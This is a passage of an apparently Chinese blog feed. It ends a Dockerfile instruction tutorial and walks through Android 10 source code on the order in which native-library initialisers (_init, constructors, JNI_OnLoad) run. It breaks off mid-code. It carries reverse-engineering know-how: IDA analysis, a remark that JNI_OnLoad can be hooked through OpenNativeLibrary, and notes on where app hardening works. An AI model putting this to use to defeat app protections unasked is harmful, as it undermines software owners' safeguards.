class="hljs bnf">USER <span class="hljs-attribute">&lt;用户名&gt;</span>[:<span class="hljs-attribute">&lt;用户组&gt;</span>]<br></code></pre></td></tr></table></figure><h3 id="VOLUME-定义匿名卷"><a href="#VOLUME-定义匿名卷" class="headerlink" title="VOLUME 定义匿名卷"></a>VOLUME 定义匿名卷</h3><p>格式为：</p> <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">VOLUME</span><span class="bash"> [<span class="hljs-string">&quot;&lt;路径1&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;路径2&gt;&quot;</span>...]</span><br><span class="hljs-keyword">VOLUME</span><span class="bash"> &lt;路径&gt;</span><br></code></pre></td></tr></table></figure><p>  容器运行时应该尽量保持容器存储层不发生写操作，对于数据库类需要保存动态数据的应用，其数据库文件应该保存于卷(volume)中。为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 Dockerfile 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-type">VOLUME</span> /<span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p>  这里的 <code>/data</code> 目录就会在运行时自动挂载为匿名卷，任何向 /data 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。当然，运行时可以覆盖这个挂载设置。比如：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">docker</span> run -d -v mydata:/<span class="hljs-class"><span class="hljs-keyword">data</span> xxxx</span><br></code></pre></td></tr></table></figure><p>  在这行命令中，就使用了 mydata 这个命名卷挂载到了 <code>/data</code> 这个位置，替代了 Dockerfile 中定义的匿名卷的挂载配置。</p><p> </p><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p><p>格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">ENV <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><br>ENV <span class="hljs-tag">&lt;<span class="hljs-name">key1</span>&gt;</span>=<span class="hljs-tag">&lt;<span class="hljs-name">value1</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">key2</span>&gt;</span>=<span class="hljs-tag">&lt;<span class="hljs-name">value2</span>&gt;</span>...<br></code></pre></td></tr></table></figure><p>以下示例设置 NODE_VERSION = 7.2.0 ， 在后续的指令中可以通过 $NODE_VERSION 引用：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">ENV</span> NODE_VERSION <span class="hljs-number">7.2</span>.<span class="hljs-number">0</span><br><br><span class="hljs-keyword">RUN</span><span class="bash"> curl -SLO <span class="hljs-string">&quot;https://nodejs.org/dist/v<span class="hljs-variable">$NODE_VERSION</span>/node-v<span class="hljs-variable">$NODE_VERSION</span>-linux-x64.tar.xz&quot;</span> \</span><br><span class="bash">  &amp;&amp; curl -SLO <span class="hljs-string">&quot;https://nodejs.org/dist/v<span class="hljs-variable">$NODE_VERSION</span>/SHASUMS256.txt.asc&quot;</span></span><br></code></pre></td></tr></table></figure><h3 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h3><p>构建参数，与 ENV 作用一至。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p><p>构建命令 docker build 中可以用 –build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">ARG <span class="hljs-attribute">&lt;参数名&gt;</span>[=<span class="hljs-attribute">&lt;默认值&gt;</span>]<br></code></pre></td></tr></table></figure><h3 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h3><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p><p>格式：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dos">HEALTHCHECK [选项] <span class="hljs-built_in">CMD</span> &lt;命令&gt;：设置检查容器健康状况的命令<br>HEALTHCHECK NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令<br><br>HEALTHCHECK [选项] <span class="hljs-built_in">CMD</span> &lt;命令&gt; : 这边 <span class="hljs-built_in">CMD</span> 后面跟随的命令使用，可以参考 <span class="hljs-built_in">CMD</span> 的用法。<br></code></pre></td></tr></table></figure><h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为 test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这是执行新镜像的 Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">ONBUILD <span class="hljs-attribute">&lt;其它指令&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SO函数运行顺序</title>
    <link href="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/"/>
    <url>/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="加载运行流程"><a href="#加载运行流程" class="headerlink" title="加载运行流程"></a>加载运行流程</h2> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B.png" class=""><h3 id="1-init"><a href="#1-init" class="headerlink" title="1. _init"></a>1. _init</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">void</span> _init(<span class="hljs-keyword">void</span>) &#123; &#125; <br></code></pre></td></tr></table></figure><p>编译生成后会在<code>.init</code>段</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/readelf.png" class=""><p>IDA反编译对应<code>_init_proc</code>方法</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/init_proc.png" class="" width="600" height="1100"><h3 id="2-constructor"><a href="#2-constructor" class="headerlink" title="2. constructor"></a>2. constructor</h3><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs delphi">__attribute__( (<span class="hljs-function"><span class="hljs-keyword">constructor</span><span class="hljs-params">(1)</span>) ) <span class="hljs-title">void</span> <span class="hljs-title">aaaa</span><span class="hljs-params">( void )</span></span><br><span class="hljs-function"><span class="hljs-comment">&#123;</span></span><br><span class="hljs-comment"><span class="hljs-function">LOGI( &quot;constructor constructor 1 called&quot; );</span></span><br><span class="hljs-comment"><span class="hljs-function"></span></span><br><span class="hljs-comment"><span class="hljs-function">&#125;</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">__<span class="hljs-title">attribute__</span><span class="hljs-params">( (<span class="hljs-keyword">constructor</span>(2)</span>) ) <span class="hljs-title">void</span> <span class="hljs-title">aaaa</span><span class="hljs-params">( void )</span></span><br><span class="hljs-function"><span class="hljs-comment">&#123;</span></span><br><span class="hljs-comment"><span class="hljs-function">LOGI( &quot;constructor constructor 2 called&quot; );</span></span><br><span class="hljs-comment"><span class="hljs-function"></span></span><br><span class="hljs-comment"><span class="hljs-function">&#125;</span></span><br></code></pre></td></tr></table></figure><p>根据设置的优先级依次调用,编译生成后会在.init_array段</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/init_array.png" class=""><p>IDA分析 ctrl+s定位到.init_array段</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/ida_init_array.png" class=""><p>点击进入方法实现</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/%E8%BF%9B%E5%85%A5%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0.png" class="" width="600" height="400"><h3 id="3-JNI-OnLoad"><a href="#3-JNI-OnLoad" class="headerlink" title="3. JNI_OnLoad"></a>3. JNI_OnLoad</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">JNIEXPORT jint JNICALL <span class="hljs-title">JNI_OnLoad</span><span class="hljs-params">(JavaVM* vm, <span class="hljs-keyword">void</span>* reserved)</span></span>&#123;<br>    <span class="hljs-built_in">LOGI</span>(<span class="hljs-string">&quot;jni onload called&quot;</span>);<br>   <span class="hljs-comment">//TODO</span><br>    <span class="hljs-keyword">return</span> JNI_VERSION_1_4;  <span class="hljs-comment">//这里很重要，必须返回版本，否则加载会失败。</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="源码分析（Android10）"><a href="#源码分析（Android10）" class="headerlink" title="源码分析（Android10）"></a>源码分析（Android10）</h2><p>Android加载动态库有三种方式</p><ul><li><p>System.loadLibrary  </p><p>java中方法,不需要指定so路径，系统会自动补全</p></li><li><p>System.load</p><p>java中方法,需要指定so路径</p></li><li><p>dlopen</p><p>bionic库中方法，需要指定so路径</p></li></ul><h3 id="java-load-so"><a href="#java-load-so" class="headerlink" title="java load so"></a>java load so</h3><p> System.loadLibrary与System.load的实现在<code>/libcore/ojluni/src/main/java/java/lang/System.java</code>中</p><p>最终都会调用<code>/libcore/ojluni/src/main/java/java/lang/Runtime.java</code>下的native方法<code>nativeLoad</code></p><p>因为<code>System.load </code>的入参不是so文件的绝对路径，所以在系统需要从<code>java.library.path</code>属性中获取系统库的地址，遍历该so文件在哪个路径下，最终返回绝对路径，一般的<code>java.library.path</code>为</p><ul><li><p>/vendor/lib</p></li><li><p>/system/lib</p></li><li><p>/data/app-lib/com.xxxxx-1</p></li></ul><p>nativeLoad的JNI实现在<code>/libcore/ojluni/src/main/native/Runtime.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">JNIEXPORT jstring JNICALL</span><br><span class="hljs-function"><span class="hljs-title">Runtime_nativeLoad</span><span class="hljs-params">(JNIEnv* env, jclass ignored, jstring javaFilename,</span></span><br><span class="hljs-params"><span class="hljs-function">                   jobject javaLoader, jclass caller)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> JVM_NativeLoad(env, javaFilename, javaLoader, caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>/art/openjdkjvm/OpenjdkJvm.cc</code>下得<code>JVM_NativeLoad</code>方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">JNIEXPORT jstring <span class="hljs-title">JVM_NativeLoad</span><span class="hljs-params">(JNIEnv* env,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 jstring javaFilename,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 jobject javaLoader,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 jclass caller)</span> </span>&#123;<br>  <br>    art::JavaVMExt* vm = art::Runtime::<span class="hljs-built_in">Current</span>()-&gt;<span class="hljs-built_in">GetJavaVM</span>();<br>    <span class="hljs-keyword">bool</span> success = vm-&gt;<span class="hljs-built_in">LoadNativeLibrary</span>(env,<br>                                         filename.<span class="hljs-built_in">c_str</span>(),<br>                                         javaLoader,<br>                                         caller,<br>                                         &amp;error_msg);<br>  <span class="hljs-comment">// Don&#x27;t let a pending exception from JNI_OnLoad cause a CheckJNI issue with NewStringUTF.</span><br>  env-&gt;<span class="hljs-built_in">ExceptionClear</span>();<br>  <span class="hljs-keyword">return</span> env-&gt;<span class="hljs-built_in">NewStringUTF</span>(error_msg.<span class="hljs-built_in">c_str</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>调用当前文件中的<code>LoadNativeLibrary</code>方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">JavaVMExt::LoadNativeLibrary</span><span class="hljs-params">(JNIEnv* env,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">const</span> std::string&amp; path,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  jobject class_loader,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  jclass caller_class,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  std::string* error_msg)</span> </span>&#123;<br>     ......<br><br>  <span class="hljs-keyword">void</span>* handle = android::<span class="hljs-built_in">OpenNativeLibrary</span>(<br>      env,<br>      runtime_-&gt;<span class="hljs-built_in">GetTargetSdkVersion</span>(),<br>      path_str,<br>      class_loader,<br>      (caller_location.<span class="hljs-built_in">empty</span>() ? <span class="hljs-literal">nullptr</span> : caller_location.<span class="hljs-built_in">c_str</span>()),<br>      library_path.<span class="hljs-built_in">get</span>(),<br>      &amp;needs_native_bridge,<br>      &amp;nativeloader_error_msg);<br><br>  <br>  <span class="hljs-keyword">bool</span> was_successful = <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">void</span>* sym = library-&gt;<span class="hljs-built_in">FindSymbol</span>(<span class="hljs-string">&quot;JNI_OnLoad&quot;</span>, <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-keyword">if</span> (sym == <span class="hljs-literal">nullptr</span>) &#123;<br>    was_successful = <span class="hljs-literal">true</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">VLOG</span>(jni) &lt;&lt; <span class="hljs-string">&quot;[Calling JNI_OnLoad in \&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="hljs-string">&quot;\&quot;]&quot;</span>;<br>    <span class="hljs-keyword">using</span> JNI_OnLoadFn = <span class="hljs-built_in"><span class="hljs-keyword">int</span></span>(*)(JavaVM*, <span class="hljs-keyword">void</span>*);<br>    JNI_OnLoadFn jni_on_load = <span class="hljs-keyword">reinterpret_cast</span>&lt;JNI_OnLoadFn&gt;(sym);<br>    <span class="hljs-keyword">int</span> version = (*jni_on_load)(<span class="hljs-keyword">this</span>, <span class="hljs-literal">nullptr</span>);<br><br>.........<br><br>    <span class="hljs-keyword">if</span> (version == JNI_ERR) &#123;<br>      <span class="hljs-built_in">StringAppendF</span>(error_msg, <span class="hljs-string">&quot;JNI_ERR returned from JNI_OnLoad in \&quot;%s\&quot;&quot;</span>, path.<span class="hljs-built_in">c_str</span>());<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (JavaVMExt::<span class="hljs-built_in">IsBadJniVersion</span>(version)) &#123;<br>      <span class="hljs-built_in">StringAppendF</span>(error_msg, <span class="hljs-string">&quot;Bad JNI version returned from JNI_OnLoad in \&quot;%s\&quot;: %d&quot;</span>,<br>                    path.<span class="hljs-built_in">c_str</span>(), version);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      was_successful = <span class="hljs-literal">true</span>;<br>    &#125;<br>  &#125;<br><br>  library-&gt;<span class="hljs-built_in">SetResult</span>(was_successful);<br>  <span class="hljs-keyword">return</span> was_successful;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终调用了<code>android::OpenNativeLibrary</code>方法加载SO文件，加载成功后会查找符号表是否有<code>JNI_OnLoad</code>,如果有则根据<code>JNI_OnLoad</code>的地址进行调用，然后判断返回值<code>version</code>是否正确,这也是为什么<code>JNI_OnLoad</code>要返回版本的原因。</p><p>所以可以通过<code>OpenNativeLibrary</code>方法对<code>JNI_OnLoad</code>进行HOOK（此时SO已加载但还未执行JNI_OnLoad方法）</p><p>上面的运行流程中<code>JNI_OnLoad</code>排在第三位，也就是说<code>_init</code>和<code>constructor</code>在<code>OpenNativeLibrary</code>方法中就以执行</p><p>继续分析<code>OpenNativeLibrary</code>方法，在<code>/system/core/libnativeloader/native_loader.cpp</code>中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">OpenNativeLibrary</span><span class="hljs-params">(JNIEnv* env, <span class="hljs-keyword">int32_t</span> target_sdk_version, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path,</span></span><br><span class="hljs-params"><span class="hljs-function">                        jobject class_loader, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* caller_location, jstring library_path,</span></span><br><span class="hljs-params"><span class="hljs-function">                        <span class="hljs-keyword">bool</span>* needs_native_bridge, <span class="hljs-keyword">char</span>** error_msg)</span> </span>&#123;<br> <br>  <br>  <span class="hljs-keyword">if</span> (class_loader == <span class="hljs-literal">nullptr</span>) &#123;<br>    *needs_native_bridge = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (caller_location != <span class="hljs-literal">nullptr</span>) &#123;<br>      <span class="hljs-keyword">android_namespace_t</span>* boot_namespace = <span class="hljs-built_in">FindExportedNamespace</span>(caller_location);<br>      <span class="hljs-keyword">if</span> (boot_namespace != <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-keyword">const</span> android_dlextinfo dlextinfo = &#123;<br>            .flags = ANDROID_DLEXT_USE_NAMESPACE,<br>            .library_namespace = boot_namespace,<br>        &#125;;<br>        <span class="hljs-keyword">void</span>* handle = <span class="hljs-built_in">android_dlopen_ext</span>(path, RTLD_NOW, &amp;dlextinfo);<br>        <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">nullptr</span>) &#123;<br>          *error_msg = <span class="hljs-built_in">strdup</span>(<span class="hljs-built_in">dlerror</span>());<br>        &#125;<br>        <span class="hljs-keyword">return</span> handle;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">void</span>* handle = <span class="hljs-built_in">dlopen</span>(path, RTLD_NOW);<br>    <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">nullptr</span>) &#123;<br>      *error_msg = <span class="hljs-built_in">strdup</span>(<span class="hljs-built_in">dlerror</span>());<br>    &#125;<br>    <span class="hljs-keyword">return</span> handle;<br>  &#125;<br> <br> ........<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">OpenNativeLibraryInNamespace</span>(ns, path, needs_native_bridge, error_msg);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">OpenNativeLibraryInNamespace</span><span class="hljs-params">(NativeLoaderNamespace* ns, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   <span class="hljs-keyword">bool</span>* needs_native_bridge, <span class="hljs-keyword">char</span>** error_msg)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (ns-&gt;<span class="hljs-built_in">is_android_namespace</span>()) &#123;<br>    android_dlextinfo extinfo;<br>    extinfo.flags = ANDROID_DLEXT_USE_NAMESPACE;<br>    extinfo.library_namespace = ns-&gt;<span class="hljs-built_in">get_android_ns</span>();<br><br>    <span class="hljs-keyword">void</span>* handle = <span class="hljs-built_in">android_dlopen_ext</span>(path, RTLD_NOW, &amp;extinfo);<br>    <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">nullptr</span>) &#123;<br>      *error_msg = <span class="hljs-built_in">strdup</span>(<span class="hljs-built_in">dlerror</span>());<br>    &#125;<br>    *needs_native_bridge = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> handle;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">void</span>* handle = <span class="hljs-built_in">NativeBridgeLoadLibraryExt</span>(path, RTLD_NOW, ns-&gt;<span class="hljs-built_in">get_native_bridge_ns</span>());<br>    <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">nullptr</span>) &#123;<br>      *error_msg = <span class="hljs-built_in">strdup</span>(<span class="hljs-built_in">NativeBridgeGetError</span>());<br>    &#125;<br>    *needs_native_bridge = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> handle;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>/bionic/libdl/libdl.cpp</code>中的<code>android_dlopen_ext</code>方法加载SO,该方法最终会调用linker中的<code>do_dlopen</code>,linker的实现在<code>/bionic/linker/linker.cpp</code>中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">do_dlopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* name, <span class="hljs-keyword">int</span> flags,</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">const</span> android_dlextinfo* extinfo,</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>* caller_addr)</span> </span>&#123;<br><br>  .......<br>    <br>  soinfo* si = <span class="hljs-built_in">find_library</span>(ns, translated_name, flags, extinfo, caller);<br>  <span class="hljs-keyword">if</span> (si != <span class="hljs-literal">nullptr</span>) &#123;<br>    <span class="hljs-keyword">void</span>* handle = si-&gt;<span class="hljs-built_in">to_handle</span>();<br>    si-&gt;<span class="hljs-built_in">call_constructors</span>();<br>    <span class="hljs-keyword">return</span> handle;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>find_library方法才是真正的加载SO，执行定位动态节、解析动态节、加载动态节 、重定位等，像SO抹头、自定义Linker等加固方式都是在这里做的文章。在低版本中加载SO文件后返回的是soinfo结构体，高版本返回的是to_handle后的指针。</p><p><code>do_dlopen</code>方法调用了<code>call_constructors</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">soinfo::call_constructors</span><span class="hljs-params">()</span> </span>&#123;<br> <br>......<br>    <br>  <span class="hljs-built_in">call_function</span>(<span class="hljs-string">&quot;DT_INIT&quot;</span>, init_func_, <span class="hljs-built_in">get_realpath</span>());<br>  <span class="hljs-built_in">call_array</span>(<span class="hljs-string">&quot;DT_INIT_ARRAY&quot;</span>, init_array_, init_array_count_, <span class="hljs-literal">false</span>, <span class="hljs-built_in">get_realpath</span>());<br><br>.......<br>&#125;<br></code></pre></td></tr></table></figure><p>调用call_function和call_array并根据<code>init_func_</code>,<code>init_array_</code>符号地址执行对应的方法</p><p>获取符号表的实现<code>/bionic/linker/linker.cpp</code>中的<code>soinfo::prelink_image</code>方法，在<code>find_library</code>方法执行完成后就已获取到符号信息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">soinfo::prelink_image</span><span class="hljs-params">()</span> </span>&#123;<br><br>........<br><br><span class="hljs-keyword">case</span> DT_INIT:<br>  init_func_ = <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">linker_ctor_function_t</span>&gt;(load_bias + d-&gt;d_un.d_ptr);<br>  <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> DT_FINI:<br>  fini_func_ = <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">linker_dtor_function_t</span>&gt;(load_bias + d-&gt;d_un.d_ptr);<br>  <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> DT_INIT_ARRAY:<br>  init_array_ = <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">linker_ctor_function_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr);<br>  <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> DT_INIT_ARRAYSZ:<br>  init_array_count_ = <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">uint32_t</span>&gt;(d-&gt;d_un.d_val) / <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-built_in">ElfW</span>(Addr));<br>  <span class="hljs-keyword">break</span>;<br>........<br>&#125;<br></code></pre></td></tr></table></figure><p>call_function实现</p><figure class="highlight javascript"><table><tr><td 